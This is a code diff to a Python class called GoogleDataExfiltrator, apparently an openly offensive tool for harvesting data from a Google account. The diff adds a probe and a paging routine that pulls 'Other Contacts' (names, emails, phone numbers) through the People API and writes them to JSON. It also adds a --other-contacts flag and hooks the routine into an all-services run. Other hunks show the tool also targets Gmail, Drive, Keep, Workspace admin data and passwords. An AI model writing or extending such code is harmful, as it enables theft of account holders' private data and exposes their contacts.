@@ -240,6 +240,34 @@ class GoogleDataExfiltrator:
             active_services['contacts'] = {'active': False, 'reason': str(e)}
             print(f"✗ Error: {e}")
         
+        # Probe Google Other Contacts
+        print("[*] Probing Google Other Contacts...", end=" ")
+        try:
+            results = self.services['people'].otherContacts().list(
+                pageSize=1,
+                readMask='names'
+            ).execute()
+            other_contacts = results.get('otherContacts', [])
+            if other_contacts:
+                # Try to get approximate count
+                # Note: totalSize not always available, so we do a quick count
+                count_results = self.services['people'].otherContacts().list(
+                    pageSize=1000,
+                    readMask='names'
+                ).execute()
+                approx_total = len(count_results.get('otherContacts', []))
+                active_services['other_contacts'] = {
+                    'active': True,
+                    'total': approx_total
+                }
+                print(f"✓ ACTIVE ({approx_total}+ auto-saved contacts)")
+            else:
+                active_services['other_contacts'] = {'active': False, 'reason': 'No other contacts'}
+                print("✗ Empty")
+        except Exception as e:
+            active_services['other_contacts'] = {'active': False, 'reason': str(e)}
+            print(f"✗ Error: {e}")
+        
         # Probe Google Tasks
         print("[*] Probing Google Tasks...", end=" ")
         try:
@@ -670,6 +698,48 @@ class GoogleDataExfiltrator:
             
         except Exception as e:
             print(f"[-] Error in Contacts exfiltration: {e}")
+    
+    def exfiltrate_other_contacts(self):
+        """Exfiltrate Google Other Contacts (auto-saved contacts)"""
+        print("\n[*] Starting Other Contacts exfiltration...")
+        other_contacts_dir = self.output_dir / 'other_contacts'
+        other_contacts_dir.mkdir(exist_ok=True)
+        
+        try:
+            # Get all other contacts
+            other_contacts = []
+            page_token = None
+            contact_limit = self.limits['contacts']
+            
+            while True:
+                results = self.services['people'].otherContacts().list(
+                    pageSize=100,
+                    readMask='names,emailAddresses,phoneNumbers',
+                    pageToken=page_token
+                ).execute()
+                
+                contacts = results.get('otherContacts', [])
+                other_contacts.extend(contacts)
+                page_token = results.get('nextPageToken')
+                
+                # Apply limit
+                if contact_limit and len(other_contacts) >= contact_limit:
+                    other_contacts = other_contacts[:contact_limit]
+                    print(f"[!] Limited to {contact_limit} other contacts")
+                    break
+                
+                if not page_token:
+                    break
+                print(f"[+] Retrieved {len(other_contacts)} other contacts so far...")
+            
+            with open(other_contacts_dir / 'other_contacts.json', 'w') as f:
+                json.dump(other_contacts, f, indent=2)
+            
+            print(f"[+] Total other contacts retrieved: {len(other_contacts)}")
+            print(f"[+] Other Contacts exfiltration complete")
+            
+        except Exception as e:
+            print(f"[-] Error in Other Contacts exfiltration: {e}")
     
     def exfiltrate_tasks(self):
         """Exfiltrate Google Tasks"""
@@ -1183,6 +1253,7 @@ class GoogleDataExfiltrator:
         self.exfiltrate_drive()
         self.exfiltrate_calendar()
         self.exfiltrate_contacts()
+        self.exfiltrate_other_contacts()
         self.exfiltrate_tasks()
         self.exfiltrate_keep()
         self.exfiltrate_youtube()
@@ -1229,6 +1300,7 @@ class GoogleDataExfiltrator:
             'drive': self.exfiltrate_drive,
             'calendar': self.exfiltrate_calendar,
             'contacts': self.exfiltrate_contacts,
+            'other_contacts': self.exfiltrate_other_contacts,
             'tasks': self.exfiltrate_tasks,
             'keep': self.exfiltrate_keep,
             'youtube': self.exfiltrate_youtube,
@@ -1279,6 +1351,8 @@ class GoogleDataExfiltrator:
                 details.append(f"{info.get('events', 0)} events")
             elif service == 'contacts':
                 details.append(f"{info.get('total', 0)} contacts")
+            elif service == 'other_contacts':
+                details.append(f"{info.get('total', 0)} auto-saved contacts")
             elif service == 'youtube':
                 details.append(f"Channel: {info.get('channel_name', 'N/A')}")
             
@@ -1331,6 +1405,7 @@ class GoogleDataExfiltrator:
                 'drive': self.exfiltrate_drive,
                 'calendar': self.exfiltrate_calendar,
                 'contacts': self.exfiltrate_contacts,
+                'other_contacts': self.exfiltrate_other_contacts,
                 'tasks': self.exfiltrate_tasks,
                 'keep': self.exfiltrate_keep,
                 'youtube': self.exfiltrate_youtube,
@@ -1394,6 +1469,8 @@ Examples:
                        help='Exfiltrate Google Calendar data')
     parser.add_argument('--contacts', action='store_true',
                        help='Exfiltrate Google Contacts data')
+    parser.add_argument('--other-contacts', action='store_true',
+                       help='Exfiltrate Google Other Contacts (auto-saved contacts)')
     parser.add_argument('--tasks', action='store_true',
                        help='Exfiltrate Google Tasks data')
     parser.add_argument('--keep', action='store_true',
@@ -1488,6 +1565,8 @@ Examples:
             exfiltrator.exfiltrate_calendar()
         if args.contacts:
             exfiltrator.exfiltrate_contacts()
+        if args.other_contacts:
+            exfiltrator.exfiltrate_other_contacts()
         if args.tasks:
             exfiltrator.exfiltrate_tasks()
         if args.keep:
@@ -1503,7 +1582,7 @@ Examples:
             exfiltrator.check_password_manager()
         
         if not any([args.gmail, args.drive, args.calendar, args.contacts, 
-                   args.tasks, args.keep, args.youtube,
+                   args.other_contacts, args.tasks, args.keep, args.youtube,
                    args.workspace, args.workspace_admin, args.passwords]):
             print("No exfiltration method specified. Use --active-only, --all, or specify individual methods.")
             parser.print_help()
